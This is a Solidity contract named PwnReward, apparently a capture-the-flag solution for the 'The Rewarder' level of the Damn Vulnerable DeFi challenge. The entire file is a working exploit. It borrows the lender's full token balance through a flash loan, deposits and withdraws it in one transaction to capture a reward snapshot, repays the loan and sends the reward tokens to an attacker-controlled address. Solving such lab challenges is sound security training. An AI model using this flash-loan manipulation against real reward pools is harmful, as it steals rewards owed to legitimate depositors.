// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "./AccountingToken.sol";
import "../DamnValuableToken.sol";

contract PwnReward {
    TheRewarderPool pool;
    FlashLoanerPool loan;
    DamnValuableToken token;
    RewardToken reward;
    AccountingToken account;
    address us;

    constructor(address _pool,
      address _loan,
      address _token,
      address _reward,
      address _account,
      address _us) {
	pool = TheRewarderPool(_pool);
	loan = FlashLoanerPool(_loan);
	token = DamnValuableToken(_token);
	reward = RewardToken(_reward);
	account = AccountingToken(_account);
	us = _us;
    }

    function pwn() external {
	loan.flashLoan(token.balanceOf(address(loan)));
    }

    function receiveFlashLoan(uint256 amount) public {
	token.approve(address(pool), amount);
	pool.deposit(amount);
	pool.withdraw(amount);
	token.transfer(address(loan), amount);
	reward.transfer(us, reward.balanceOf(address(this)));
    }
}
